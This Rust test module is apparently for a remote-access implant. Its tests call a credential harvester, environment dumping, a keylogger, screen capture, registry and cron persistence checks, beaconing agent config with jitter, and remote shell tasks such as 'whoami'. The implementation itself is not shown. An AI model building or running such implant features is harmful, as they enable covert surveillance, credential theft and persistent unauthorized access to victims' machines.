#[cfg(test)]
mod tests {
    use super::*;
    
    // ========================================================================
    // Command Execution Tests
    // ========================================================================
    
    #[test]
    fn test_command_executor_creation() {
        let executor = CommandExecutor::new();
        assert!(executor.is_ok());
    }
    
    #[test]
    fn test_shell_command() {
        let executor = CommandExecutor::new().unwrap();
        let result = executor.execute_shell("echo test");
        assert!(result.is_ok());
    }
    
    #[cfg(target_os = "windows")]
    #[test]
    fn test_powershell_command() {
        let executor = CommandExecutor::new().unwrap();
        let result = executor.execute_powershell("Write-Output 'test'");
        assert!(result.is_ok());
    }
    
    // ========================================================================
    // File Operations Tests
    // ========================================================================
    
    #[test]
    fn test_file_read_write() {
        use std::fs;
        use tempfile::NamedTempFile;
        
        let temp_file = NamedTempFile::new().unwrap();
        let path = temp_file.path().to_str().unwrap();
        
        // Write
        let data = b"test data";
        let result = FileOperations::write_file(path, data);
        assert!(result.is_ok());
        
        // Read
        let read_result = FileOperations::read_file(path);
        assert!(read_result.is_ok());
        assert_eq!(read_result.unwrap(), data);
    }
    
    #[test]
    fn test_list_directory() {
        let result = FileOperations::list_directory(".");
        assert!(result.is_ok());
        
        let entries = result.unwrap();
        assert!(!entries.is_empty());
    }
    
    #[test]
    fn test_file_not_found() {
        let result = FileOperations::read_file("/nonexistent/file.txt");
        assert!(result.is_err());
    }
    
    // ========================================================================
    // Credentials Tests
    // ========================================================================
    
    #[test]
    fn test_credentials_harvester_creation() {
        let harvester = CredentialsHarvester::new();
        assert!(harvester.is_ok());
    }
    
    #[cfg(target_os = "windows")]
    #[test]
    fn test_enumerate_credentials() {
        let harvester = CredentialsHarvester::new().unwrap();
        let result = harvester.enumerate_credentials();
        assert!(result.is_ok());
    }
    
    #[test]
    fn test_environment_variables() {
        let harvester = CredentialsHarvester::new().unwrap();
        let result = harvester.dump_environment();
        assert!(result.is_ok());
    }
    
    // ========================================================================
    // Keylogger Tests
    // ========================================================================
    
    #[test]
    fn test_keylogger_creation() {
        let logger = KeyLogger::new();
        assert!(logger.is_ok());
    }
    
    #[test]
    fn test_keylogger_start_stop() {
        let mut logger = KeyLogger::new().unwrap();
        let start_result = logger.start();
        assert!(start_result.is_ok());
        
        let stop_result = logger.stop();
        assert!(stop_result.is_ok());
    }
    
    // ========================================================================
    // Screen Capture Tests
    // ========================================================================
    
    #[test]
    fn test_screen_capture_creation() {
        let capture = ScreenCapture::new();
        assert!(capture.is_ok());
    }
    
    #[test]
    fn test_capture_screenshot() {
        let capture = ScreenCapture::new().unwrap();
        let result = capture.capture();
        // May fail in headless environment
        if result.is_ok() {
            let screenshot = result.unwrap();
            assert!(!screenshot.is_empty());
        }
    }
    
    #[test]
    fn test_screenshot_base64() {
        let capture = ScreenCapture::new().unwrap();
        let result = ScreenCapture::capture_screen_base64();
        // May fail in headless environment
        if result.is_ok() {
            let b64 = result.unwrap();
            assert!(!b64.is_empty());
        }
    }
    
    // ========================================================================
    // Persistence Tests
    // ========================================================================
    
    #[test]
    fn test_persistence_creation() {
        let persistence = Persistence::new();
        assert!(persistence.is_ok());
    }
    
    #[cfg(target_os = "windows")]
    #[test]
    fn test_registry_persistence_check() {
        let persistence = Persistence::new().unwrap();
        let result = persistence.check_installed();
        assert!(result.is_ok());
    }
    
    #[cfg(target_os = "linux")]
    #[test]
    fn test_cron_persistence_check() {
        let persistence = Persistence::new().unwrap();
        let result = persistence.check_installed();
        assert!(result.is_ok());
    }
    
    // ========================================================================
    // Agent Config Tests
    // ========================================================================
    
    #[test]
    fn test_agent_config_creation() {
        let config = AgentConfig {
            server_host: "localhost".to_string(),
            server_port: 8080,
            beacon_interval: 60,
            jitter: 0.2,
        };
        
        assert_eq!(config.server_host, "localhost");
        assert_eq!(config.server_port, 8080);
        assert_eq!(config.beacon_interval, 60);
        assert_eq!(config.jitter, 0.2);
    }
    
    // ========================================================================
    // Task Execution Tests
    // ========================================================================
    
    #[test]
    fn test_task_structure() {
        let task = Task {
            id: 1,
            command: "shell".to_string(),
            arguments: vec!["whoami".to_string()],
        };
        
        assert_eq!(task.id, 1);
        assert_eq!(task.command, "shell");
        assert_eq!(task.arguments.len(), 1);
    }
    
    #[test]
    fn test_task_result_structure() {
        let result = TaskResult {
            task_id: 1,
            success: true,
            output: "test output".to_string(),
            error: None,
        };
        
        assert_eq!(result.task_id, 1);
        assert!(result.success);
        assert_eq!(result.output, "test output");
        assert!(result.error.is_none());
    }
    
    // ========================================================================
    // FFI Tests
    // ========================================================================
    
    #[test]
    fn test_ffi_agent_new() {
        let ptr = agent_new(
            "localhost\0".as_ptr() as *const i8,
            8080,
            60,
            0.2
        );
        assert!(!ptr.is_null());
        agent_destroy(ptr);
    }
    
    #[test]
    fn test_ffi_agent_lifecycle() {
        let ptr = agent_new(
            "localhost\0".as_ptr() as *const i8,
            8080,
            60,
            0.2
        );
        assert!(!ptr.is_null());
        
        // Test connect (will fail without server)
        let connect_result = agent_connect(ptr);
        // Expected to fail without server running
        
        agent_destroy(ptr);
    }
    
    // ========================================================================
    // Integration Tests
    // ========================================================================
    
    #[test]
    fn test_full_task_execution() {
        let task = Task {
            id: 1,
            command: "shell".to_string(),
            arguments: vec!["echo test".to_string()],
        };
        
        let result = execute_task(&task);
        assert!(result.success || !result.error.is_none());
    }
    
    #[test]
    fn test_invalid_command() {
        let task = Task {
            id: 1,
            command: "invalid_command".to_string(),
            arguments: vec![],
        };
        
        let result = execute_task(&task);
        assert!(!result.success);
    }
    
    // ========================================================================
    // Performance Tests
    // ========================================================================
    
    #[test]
    fn test_command_execution_performance() {
        use std::time::Instant;
        
        let executor = CommandExecutor::new().unwrap();
        let start = Instant::now();
        
        for _ in 0..100 {
            let _ = executor.execute_shell("echo test");
        }
        
        let duration = start.elapsed();
        assert!(duration.as_secs() < 10); // 100 commands in <10 seconds
    }
}
